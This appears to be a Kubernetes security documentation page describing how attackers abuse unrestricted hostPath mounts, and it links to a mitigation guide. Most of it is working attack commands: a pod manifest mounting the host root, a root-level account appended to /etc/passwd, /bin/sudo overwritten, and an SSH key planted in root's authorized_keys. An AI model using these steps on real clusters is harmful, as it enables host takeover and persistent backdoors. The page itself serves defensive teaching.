---
sidebar_position: 10
title: "Unrestricted HostPath Mounts"
description: "How attackers exploit unrestricted hostPath mounts to gain access to the host filesystem and escalate privileges."
keywords: [kubernetes security, hostPath, host filesystem, container escape, privilege escalation, volume security, pod security, node compromise, filesystem access, CKS]
---

# Unrestricted HostPath Mounts

**hostPath** volumes in Kubernetes allow pods to directly access the host filesystem. If improperly configured, attackers can exploit **unrestricted hostPath mounts** to **access sensitive files, modify system configurations, and escalate privileges**.

---

## Exploitation Steps: Abusing hostPath Mounts

An attacker gains unauthorized access to the **host filesystem** by exploiting a misconfigured **hostPath volume**.

### Step 1: Identify Misconfigured hostPath Volumes

The attacker searches for pods with **hostPath mounts** that expose critical directories:

```bash
kubectl get pods -A -o=jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.volumes[*].hostPath.path}{"\n"}{end}'
```

If a pod is mounting `/etc`, `/var/lib/kubelet`, or `/root`, the attacker proceeds.

### Step 2: Deploy a Malicious Pod with a hostPath Mount

The attacker creates a new pod that mounts a **privileged directory** from the host:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: exploit-hostpath
spec:
  containers:
    - name: attacker-container
      image: alpine
      command: ["/bin/sh", "-c"]
      args: ["sleep 3600"]
      volumeMounts:
        - mountPath: /host
          name: host-root
  volumes:
    - name: host-root
      hostPath:
        path: /
        type: Directory
```

```bash
kubectl apply -f exploit-hostpath.yaml
```

The pod now has **full access to the host filesystem**.

### Step 3: Escalate Privileges

The attacker gains root access by modifying **/etc/passwd**:

```bash
echo "attacker:x:0:0::/root:/bin/bash" >> /host/etc/passwd
```

Or by replacing a system binary with a malicious payload:

```bash
echo '#!/bin/sh\necho "Root access gained"' > /host/bin/sudo
chmod +x /host/bin/sudo
```

### Step 4: Persist in the System

To maintain access, the attacker **creates a backdoor** by modifying the host’s SSH keys:

```bash
echo "attacker-public-key" >> /host/root/.ssh/authorized_keys
```

Even if Kubernetes detects and removes the pod, the attacker retains **persistent access** to the host.

### Result

The attacker now has **root privileges on the host**, allowing them to **exfiltrate data, modify critical system files, and take full control of the Kubernetes node**.

---

## Mitigation Steps

To protect against **unrestricted hostPath mounts**, follow the security best practices outlined in:

➡ **[Restricting HostPath Mounts in Kubernetes](/docs/best_practices/cluster_setup_and_hardening/pod_security/unrestricted_hostpath_mitigation)**

This guide covers techniques such as **disabling hostPath, enforcing PodSecurityAdmission policies, using AppArmor and Seccomp profiles, and restricting privileged containers** to prevent unauthorized access to the host filesystem.
